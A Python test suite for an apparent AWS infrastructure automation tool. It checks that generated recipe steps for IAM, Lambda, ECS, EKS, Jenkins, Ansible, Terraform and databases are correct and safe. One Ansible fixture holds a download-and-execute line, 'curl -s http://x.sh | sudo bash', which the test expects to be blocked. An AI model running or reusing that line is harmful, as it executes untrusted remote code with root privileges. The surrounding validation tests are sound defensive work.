"""Recipes: questions, generated files, generated steps (validated like any script), safety scans."""
import json
import tempfile
import unittest
import zipfile
from pathlib import Path
from unittest import mock

import yaml

from core import prereqs, recipes, scripts, templates, tools, workspace
from core.scripts import ScriptDraft
from core.templates import TaskQuestions, TemplateError
from tests.fakes import FakeConn
from tests.test_templates import FakeEc2Infra, FakeSsm

ACCOUNT = "123456789012"


class NotFound(Exception):
    def __init__(self, code):
        super().__init__(code)
        self.response = {"Error": {"Code": code}}


class _Pages:
    def __init__(self, pages):
        self.pages = pages

    def paginate(self, **kw):
        return iter(self.pages)


class FakeEc2(FakeEc2Infra):
    def describe_subnets(self):
        out = super().describe_subnets()
        out["Subnets"].append({"SubnetId": "subnet-pub2", "CidrBlock": "10.0.1.0/24", "AvailabilityZone": "us-east-1b",
                               "VpcId": "vpc-111", "MapPublicIpOnLaunch": True})
        return out

    def get_paginator(self, op):
        assert op == "describe_instances"
        return _Pages([{"Reservations": [{"Instances": [
            {"InstanceId": "i-0aaaaaaaaaaaaaaa1", "PublicIpAddress": "3.110.1.2", "ImageId": "ami-0abc",
             "SecurityGroups": [{"GroupId": "sg-web"}], "Tags": [{"Key": "Name", "Value": "web-demo"}]}]}]}])

    def describe_images(self, ImageIds):
        return {"Images": [{"ImageId": ImageIds[0], "RootDeviceName": "/dev/xvda", "Name": "al2023-ami-2023"}]}

    def describe_security_groups(self, Filters=None, GroupIds=None):
        return {"SecurityGroups": [{"GroupId": "sg-web", "GroupName": "web", "Description": "web", "VpcId": "vpc-111",
                                    "IpPermissions": [
                                        {"IpProtocol": "tcp", "FromPort": 22, "ToPort": 22,
                                         "IpRanges": [{"CidrIp": "203.0.113.5/32"}]}]}]}


class FakeSts:
    def get_caller_identity(self):
        return {"Account": ACCOUNT}


class FakeIam:
    def get_paginator(self, op):
        doc = {"Statement": [{"Effect": "Allow", "Principal": {"Service": "lambda.amazonaws.com"}}]}
        return _Pages([{"Roles": [{"RoleName": "existing-lambda-role", "Arn": f"arn:aws:iam::{ACCOUNT}:role/existing",
                                   "AssumeRolePolicyDocument": doc}]}])


class FakeLambda:
    def __init__(self, existing=()):
        self.existing = set(existing)

    def get_function_configuration(self, FunctionName):
        if FunctionName in self.existing:
            return {"FunctionArn": f"arn:aws:lambda:us-east-1:{ACCOUNT}:function:{FunctionName}"}
        raise NotFound("ResourceNotFoundException")


class FakeEcr:
    def describe_repositories(self, repositoryNames):
        raise NotFound("RepositoryNotFoundException")


def conn(lambdas=()):
    return FakeConn({"ec2": FakeEc2(), "ssm": FakeSsm(), "sts": FakeSts(), "iam": FakeIam(),
                     "lambda": FakeLambda(lambdas), "ecr": FakeEcr()})


class RecipeTest(unittest.TestCase):
    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp())
        ws = self.tmp / "workspace"
        patches = [mock.patch.object(workspace, "WORKSPACE", ws), mock.patch.object(recipes, "which", return_value="x"),
                   mock.patch.object(prereqs, "which", return_value="x"),
                   mock.patch.object(templates.Env, "my_ip", return_value="203.0.113.5")]
        for p in patches:
            p.start()
            self.addCleanup(p.stop)
        self.addCleanup(__import__("shutil").rmtree, self.tmp, ignore_errors=True)

    def folder(self, name, files: dict) -> str:
        d = self.tmp / name
        for rel, text in files.items():
            (d / rel).parent.mkdir(parents=True, exist_ok=True)
            (d / rel).write_text(text)
        return str(d)

    def build(self, template, inputs, c=None) -> ScriptDraft:
        """Like the user submitting the form: the given answers plus the suggested defaults."""
        c = c or conn()
        answers = dict(inputs)
        for _ in range(6):
            draft = templates.plan(template, answers, c)
            if not isinstance(draft, TaskQuestions):
                break
            errors = [(q.key, q.error) for q in draft.questions if q.error]
            empty_ok = {f.key for f in templates.TEMPLATES[template].fields if f.allow_empty}
            missing = [q.key for q in draft.questions if q.default in (None, "", []) and q.key not in empty_ok]
            if errors or missing:
                self.fail(f"{template}: errors {errors}, no default for {missing}")
            answers.update({q.key: q.default for q in draft.questions})
        else:
            self.fail(f"{template} keeps asking")
        scripts.validate_steps(draft.steps)
        scripts.render_cli(draft.steps, "us-east-1", draft.notes)
        return draft


class TestIamRole(RecipeTest):
    def test_role_with_instance_profile(self):
        d = self.build("iam_role", {"name": "web-role", "service": "ec2",
                                    "policies": ["AmazonSSMManagedInstanceCore"]})
        ops = [s["operation"] for s in d.steps]
        self.assertEqual(ops, ["create_role", "attach_role_policy", "create_instance_profile",
                               "add_role_to_instance_profile"])
        self.assertTrue(d.destructive)
        self.assertIn("ec2.amazonaws.com", d.steps[0]["params"]["AssumeRolePolicyDocument"])

    def test_admin_rejected(self):
        q = templates.plan("iam_role", {"name": "x", "service": "lambda", "policies": ["AdministratorAccess"]}, conn())
        self.assertIsInstance(q, TaskQuestions)
        self.assertIn("not a policy name", next(x.error for x in q.questions if x.key == "policies"))
        q = templates.plan("iam_role", {"name": "x", "service": "lambda",
                                        "policies": ["arn:aws:iam::aws:policy/AdministratorAccess"]}, conn())
        self.assertIn("cannot be granted", next(x.error for x in q.questions if x.key == "policies"))

    def test_llm_guess_needs_confirmation(self):
        guessed = {"name": "r", "service": "lambda", "policies": ["ReadOnlyAccess"]}
        confirmed = set(guessed) - templates.must_ask_keys("iam_role")
        q = templates.plan("iam_role", guessed, conn(), confirmed)
        self.assertEqual({x.key for x in q.questions}, {"service", "policies"})


class TestLambda(RecipeTest):
    def code(self):
        return self.folder("fn", {"lambda_function.py": "def lambda_handler(e, c):\n    return 1\n",
                                  ".env": "SECRET=1", "lib/util.py": "x = 1"})

    def test_create_with_new_role_and_schedule(self):
        d = self.build("lambda_function", {"name": "hello", "source_folder": self.code(),
                                           "schedule": "cron(30 4 * * ? *)"})
        ops = [s["operation"] for s in d.steps]
        self.assertEqual(ops, ["create_role", "attach_role_policy", "create_function", "put_rule", "add_permission",
                               "put_targets"])
        fn = d.steps[2]["params"]
        self.assertEqual((fn["Runtime"], fn["Handler"]), ("python3.12", "lambda_function.lambda_handler"))
        self.assertEqual(fn["Role"], "{{role.Role.Arn}}")
        zip_path = Path(fn["Code"]["ZipFile"][len("@file:"):])
        with zipfile.ZipFile(zip_path) as zf:
            names = zf.namelist()
        self.assertIn("lambda_function.py", names)
        self.assertIn("lib/util.py", names)
        self.assertNotIn(".env", names)
        self.assertTrue(any("10:00" in n and "Asia/Kolkata" in n for n in d.notes), d.notes)
        self.assertEqual(d.steps[1]["pause_after"], 15)

    def test_existing_function_updates_code_only(self):
        d = self.build("lambda_function", {"name": "hello", "source_folder": self.code()}, conn(lambdas=["hello"]))
        self.assertEqual([s["operation"] for s in d.steps], ["update_function_code"])

    def test_bad_handler_and_schedule(self):
        q = templates.plan("lambda_function", {"name": "h", "source_folder": self.code(), "handler": "nope.handler",
                                               "schedule": "every day"}, conn())
        errs = {x.key: x.error for x in q.questions}
        self.assertIn("no file nope.py", errs["handler"])
        self.assertIn("cron", errs["schedule"])


class TestContainers(RecipeTest):
    def app(self):
        return self.folder("app", {"Dockerfile": "FROM nginx:alpine\nCOPY . /usr/share/nginx/html\nEXPOSE 8080\n",
                                   "index.html": "hi"})

    def test_ecs_fargate(self):
        q = templates.plan("ecs_fargate_service", {"app_folder": self.app()}, conn(), confirmed=set())
        port_q = next(x for x in q.questions if x.key == "container_port")
        self.assertEqual(port_q.default, 8080)
        d = self.build("ecs_fargate_service", {"app_folder": self.app(), "name": "web", "container_port": 8080,
                                               "subnets": ["subnet-pub", "subnet-pub2"]})
        kinds = [s.get("kind") or s["operation"] for s in d.steps]
        self.assertEqual(kinds[:4], ["create_repository", "command", "ecr_login", "command"])
        for op in ("create_role", "create_cluster", "register_task_definition", "create_service"):
            self.assertIn(op, kinds)
        self.assertEqual(kinds[-1], "check")
        build = d.steps[1]
        self.assertTrue(build["args"][build["args"].index("-t") + 1].startswith(
            f"{ACCOUNT}.dkr.ecr.us-east-1.amazonaws.com/web:"))
        self.assertEqual(build["args"][build["args"].index("-f") + 1], "Dockerfile")
        svc = next(s for s in d.steps if s.get("operation") == "create_service")
        self.assertEqual(svc["params"]["networkConfiguration"]["awsvpcConfiguration"]["assignPublicIp"], "ENABLED")
        self.assertTrue(svc["undo"]["params"]["force"])
        self.assertTrue(any("COST" in n for n in d.notes))

    def test_ecs_needs_public_subnets_in_one_vpc(self):
        q = templates.plan("ecs_fargate_service", {"app_folder": self.app(), "container_port": 80,
                                                   "subnets": ["subnet-priv"]}, conn())
        self.assertIn("not a public subnet", next(x.error for x in q.questions if x.key == "subnets"))

    def test_eks_with_dockerfile_app(self):
        q = templates.plan("eks_cluster", {"cost_ok": "no"}, conn())
        self.assertIn("cancelled", next(x.error for x in q.questions if x.key == "cost_ok"))
        d = self.build("eks_cluster", {"cost_ok": "yes", "name": "demo", "app_source": "dockerfile",
                                       "app_folder": self.app(), "container_port": 8080, "network": "new",
                                       "node_type": "t3.small", "nodes": 1})
        tools_used = [s.get("tool") for s in d.steps if s.get("kind") == "command"]
        self.assertEqual(tools_used, ["docker", "docker", "eksctl", "aws", "kubectl", "kubectl"])
        eks = next(s for s in d.steps if s.get("tool") == "eksctl")
        self.assertEqual(eks["undo"]["args"][:2], ["delete", "cluster"])
        cfg = yaml.safe_load(Path(eks["args"][3]).read_text())
        self.assertEqual(cfg["vpc"]["nat"]["gateway"], "Disable")
        self.assertEqual(cfg["managedNodeGroups"][0]["instanceType"], "t3.small")
        self.assertEqual(cfg["metadata"]["tags"]["Project"], "kintsugi")
        app = next(s for s in d.steps if s.get("tool") == "kubectl" and s["args"][0] == "apply")
        docs = list(yaml.safe_load_all(Path(app["args"][2]).read_text()))
        self.assertEqual(docs[1]["spec"]["type"], "LoadBalancer")
        self.assertEqual(docs[0]["spec"]["template"]["spec"]["containers"][0]["ports"][0]["containerPort"], 8080)
        self.assertTrue(any("COST WARNING" in n for n in d.notes))

    def test_eks_existing_subnets_need_two_zones(self):
        base = {"cost_ok": "yes", "name": "demo", "app_source": "none", "network": "existing", "node_type": "t3.small"}
        q = templates.plan("eks_cluster", {**base, "subnets": ["subnet-pub"]}, conn())
        self.assertIn("2 different availability zones", next(x.error for x in q.questions if x.key == "subnets"))
        d = self.build("eks_cluster", {**base, "subnets": ["subnet-pub", "subnet-pub2"]})
        self.assertEqual(d.steps[0]["operation"], "create_tags")


class TestJenkins(RecipeTest):
    def test_only_my_ip(self):
        d = self.build("jenkins_server", {"subnet_id": "subnet-pub", "admin_cidr": "203.0.113.5/32"})
        ingress = d.steps[1]["params"]["IpPermissions"]
        self.assertEqual(sorted(p["FromPort"] for p in ingress), [22, 8080])
        self.assertTrue(all(p["IpRanges"][0]["CidrIp"] == "203.0.113.5/32" for p in ingress))
        self.assertIn("dnf install -y jenkins", d.steps[2]["params"]["UserData"])
        self.assertEqual(d.steps[3]["params"]["port"], 8080)


class TestAnsible(RecipeTest):
    def key(self):
        return self.folder("keys", {"web.pem": "-----BEGIN KEY-----"}) + "\\web.pem"

    def test_static_site(self):
        site = self.folder("mysite", {"index.html": "<h1>hi</h1>", "css/a.css": "", ".git/config": "x", ".env": "A=1"})
        d = self.build("ansible_website", {"instance": "i-0aaaaaaaaaaaaaaa1", "folder": site, "app_type": "static",
                                           "ssh_key_path": self.key()})
        self.assertEqual([s["kind"] for s in d.steps], ["ansible", "ansible", "check"])
        self.assertEqual(d.steps[0]["extra_args"], ["--syntax-check"])
        self.assertNotIn("ssh_key_path", d.steps[0])
        wd = Path(d.steps[1]["workdir"])
        play = yaml.safe_load((wd / "site.yml").read_text())
        names = [t["name"] for t in play[0]["tasks"]]
        self.assertIn("Copy the files", names)
        self.assertTrue((wd / "site" / "css" / "a.css").is_file())
        self.assertFalse((wd / "site" / ".env").exists())
        self.assertFalse((wd / "site" / ".git").exists())
        inv = (wd / "inventory.ini").read_text()
        self.assertIn("3.110.1.2 ansible_user=ec2-user", inv)
        self.assertIn("StrictHostKeyChecking=accept-new", inv)
        self.assertEqual(d.steps[2]["params"]["url"], "http://3.110.1.2/")
        self.assertTrue(any("port 80" in n for n in d.notes))

    def test_flask_site(self):
        app = self.folder("flaskapp", {"requirements.txt": "flask", "app.py": "from flask import Flask\nserver = Flask(__name__)\n"})
        q = templates.plan("ansible_website", {"instance": "i-0aaaaaaaaaaaaaaa1", "folder": app}, conn(), confirmed=set())
        defaults = {x.key: x.default for x in q.questions}
        self.assertEqual(defaults["app_type"], "flask")
        d = self.build("ansible_website", {"instance": "i-0aaaaaaaaaaaaaaa1", "folder": app, "app_type": "flask",
                                           "ssh_key_path": self.key()})
        text = (Path(d.steps[1]["workdir"]) / "site.yml").read_text()
        play = yaml.safe_load(text)
        self.assertIn("app:server", text)
        self.assertIn("DynamicUser=yes", text)
        self.assertTrue(any("gunicorn" in t["name"] for t in play[0]["tasks"]))

    def test_own_playbook_risky_tasks_blocked(self):
        bad = self.folder("pb", {"site.yml": "- hosts: all\n  tasks:\n    - shell: curl -s http://x.sh | sudo bash\n"})
        with self.assertRaises(TemplateError) as cm:
            self.build("ansible_playbook", {"folder": bad, "playbook": "site.yml",
                                            "instances": ["i-0aaaaaaaaaaaaaaa1"], "ssh_key_path": self.key()})
        self.assertIn("pipes a download", str(cm.exception))
        good = self.folder("pb2", {"site.yml": "- hosts: all\n  tasks:\n    - ping:\n"})
        d = self.build("ansible_playbook", {"folder": good, "playbook": "site.yml",
                                            "instances": ["i-0aaaaaaaaaaaaaaa1"], "ssh_key_path": self.key()})
        self.assertEqual(d.steps[1]["inventory"], "kintsugi-inventory.ini")


class TestTerraform(RecipeTest):
    def test_plan_and_apply(self):
        tf = self.folder("tf", {"main.tf": 'resource "aws_s3_bucket" "b" { bucket = "x" }\n'})
        d = self.build("terraform_project", {"folder": tf, "action": "plan"})
        self.assertEqual([s["args"][0] for s in d.steps], ["init", "validate", "plan"])
        self.assertFalse(d.destructive)
        d = self.build("terraform_project", {"folder": tf, "action": "apply"})
        self.assertEqual(d.steps[-1]["args"][-1], "tfplan")
        self.assertEqual(d.steps[-1]["undo"]["args"][0], "destroy")
        d = self.build("terraform_project", {"folder": tf, "action": "destroy"})
        self.assertTrue(d.destructive)

    def test_risky_terraform_blocked(self):
        tf = self.folder("tf", {"main.tf": 'resource "aws_security_group" "s" {\n  ingress {\n    from_port = 22\n'
                                           '    to_port = 22\n    protocol = "tcp"\n    cidr_blocks = ["0.0.0.0/0"]\n  }\n}\n'})
        with self.assertRaises(TemplateError) as cm:
            templates.plan("terraform_project", {"folder": tf, "action": "apply"}, conn())
        self.assertIn("SSH (22) to 0.0.0.0/0", str(cm.exception))


class TestToolWiring(unittest.TestCase):
    def test_plan_task_accepts_all_recipes(self):
        for name in templates.TEMPLATES:
            tools.validate_args("plan_task", {"template": name, "inputs": {}})
        with self.assertRaises(tools.ToolError):
            tools.validate_args("plan_task", {"template": "mine_bitcoin"})

    def test_aws_write_iam_normalizes_policy(self):
        args = tools.validate_args("aws_write", {"title": "policy", "service": "iam", "operation": "create_policy",
                                                 "params": {"PolicyName": "read-b", "PolicyDocument": {
                                                     "Version": "2012-10-17", "Statement": [{
                                                         "Effect": "Allow", "Action": "s3:GetObject",
                                                         "Resource": "arn:aws:s3:::b/*"}]}}})
        draft = tools.aws_write(None, args)
        self.assertIsInstance(draft.steps[0]["params"]["PolicyDocument"], str)
        self.assertTrue(draft.destructive)


if __name__ == "__main__":
    unittest.main()


class TestDatabase(RecipeTest):
    def ops(self, d):
        return [f"{s['service']}.{s['operation']}" for s in d.steps]

    def test_postgres_private(self):
        d = self.build("database", {"engine": "postgres", "name": "shop-db"})
        self.assertEqual(self.ops(d), ["ec2.create_security_group", "ec2.authorize_security_group_ingress",
                                       "rds.create_db_subnet_group", "rds.create_db_instance"])
        db = d.steps[-1]["params"]
        self.assertTrue(db["ManageMasterUserPassword"])
        self.assertNotIn("MasterUserPassword", db)
        self.assertFalse(db["PubliclyAccessible"])
        self.assertTrue(db["StorageEncrypted"])
        self.assertEqual(d.steps[-1]["undo"]["params"]["SkipFinalSnapshot"], True)
        self.assertEqual(sorted(d.steps[2]["params"]["SubnetIds"]), ["subnet-priv", "subnet-pub"])
        rule = d.steps[1]["params"]["IpPermissions"][0]
        self.assertEqual((rule["FromPort"], rule["IpRanges"][0]["CidrIp"]), (5432, "10.0.2.0/24"))
        self.assertFalse(d.destructive)
        self.assertTrue(any("Secrets Manager" in n for n in d.notes))

    def test_mysql_public_only_my_ip_needs_confirmation(self):
        d = self.build("database", {"engine": "mysql", "access": "my_ip"})
        self.assertTrue(d.steps[-1]["params"]["PubliclyAccessible"])
        cidrs = [r["CidrIp"] for r in d.steps[1]["params"]["IpPermissions"][0]["IpRanges"]]
        self.assertIn("203.0.113.5/32", cidrs)
        self.assertNotIn("0.0.0.0/0", cidrs)
        self.assertEqual(sorted(d.steps[2]["params"]["SubnetIds"]), ["subnet-pub", "subnet-pub2"])
        self.assertTrue(d.destructive)

    def test_aurora_serverless(self):
        d = self.build("database", {"engine": "aurora-postgresql"})
        self.assertEqual(self.ops(d)[-2:], ["rds.create_db_cluster", "rds.create_db_instance"])
        self.assertEqual(d.steps[-2]["params"]["Engine"], "aurora-postgresql")
        self.assertEqual(d.steps[-1]["params"]["DBInstanceClass"], "db.serverless")
        self.assertTrue(any("Aurora Serverless v2" in n and "$5" in n for n in d.notes))

    def test_dynamodb(self):
        d = self.build("database", {"engine": "dynamodb", "name": "orders", "partition_key": "order_id",
                                    "sort_key": "created_at", "sort_key_type": "N"})
        self.assertEqual(self.ops(d), ["dynamodb.create_table"])
        p = d.steps[0]["params"]
        self.assertEqual(p["BillingMode"], "PAY_PER_REQUEST")
        self.assertEqual([k["KeyType"] for k in p["KeySchema"]], ["HASH", "RANGE"])
        self.assertEqual(p["AttributeDefinitions"][1], {"AttributeName": "created_at", "AttributeType": "N"})
        self.assertEqual(d.steps[0]["undo"]["operation"], "delete_table")

    def test_docdb_and_redis(self):
        d = self.build("database", {"engine": "docdb"})
        self.assertEqual(self.ops(d)[-3:], ["docdb.create_db_subnet_group", "docdb.create_db_cluster",
                                            "docdb.create_db_instance"])
        self.assertEqual(d.steps[1]["params"]["IpPermissions"][0]["FromPort"], 27017)
        r = self.build("database", {"engine": "redis", "name": "cache"})
        self.assertEqual(self.ops(r)[-1], "elasticache.create_cache_cluster")
        self.assertEqual(r.steps[-1]["params"]["CacheNodeType"], "cache.t3.micro")

    def test_engine_words_and_must_ask(self):
        q = templates.plan("database", {"engine": "aurora-postgresql"}, conn(), confirmed=set())
        self.assertIsInstance(q, TaskQuestions)
        self.assertIn("engine", [x.key for x in q.questions])
        self.assertEqual(recipes.engine_from_text("a MongoDB database"), "docdb")
        self.assertEqual(recipes.engine_from_text("aurora postgres please"), "aurora-postgresql")

    def test_one_az_rejected(self):
        q = templates.plan("database", {"engine": "postgres", "subnets": ["subnet-pub"]}, conn())
        self.assertTrue(any(x.key == "subnets" and "2 different" in x.error for x in q.questions))


class TestDatabasePasswordsInScripts(unittest.TestCase):
    def test_plain_password_rejected(self):
        step = {"service": "rds", "operation": "create_db_instance", "params": {
            "DBInstanceIdentifier": "x", "Engine": "postgres", "DBInstanceClass": "db.t3.micro",
            "MasterUsername": "a", "MasterUserPassword": "Hunter2Hunter2!"}}
        with self.assertRaisesRegex(scripts.ScriptError, "ManageMasterUserPassword"):
            scripts.validate_step(step)
        with self.assertRaisesRegex(scripts.ScriptError, "passwords"):
            scripts.validate_step({"service": "elasticache", "operation": "create_replication_group", "params": {
                "ReplicationGroupId": "x", "ReplicationGroupDescription": "x", "AuthToken": "abcdefghijklmnop1"}})

    def test_managed_password_added(self):
        p = scripts.normalize_params("rds", "create_db_instance", {"MasterUsername": "a", "Engine": "mysql"})
        self.assertTrue(p["ManageMasterUserPassword"])
        p = scripts.normalize_params("redshift-serverless", "create_namespace",
                                     {"namespaceName": "n", "adminUsername": "a"})
        self.assertTrue(p["manageAdminPassword"])
        self.assertNotIn("ManageMasterUserPassword", scripts.normalize_params("rds", "create_db_instance",
                                                                              {"Engine": "mysql"}))

    def test_aws_write_database_goes_through(self):
        d = tools.aws_write(None, tools.AwsWriteArgs(service="rds", operation="create_db_instance", title="db", params={
            "DBInstanceIdentifier": "x", "Engine": "postgres", "DBInstanceClass": "db.t3.micro",
            "AllocatedStorage": 20, "MasterUsername": "dbadmin"}))
        self.assertTrue(d.steps[0]["params"]["ManageMasterUserPassword"])
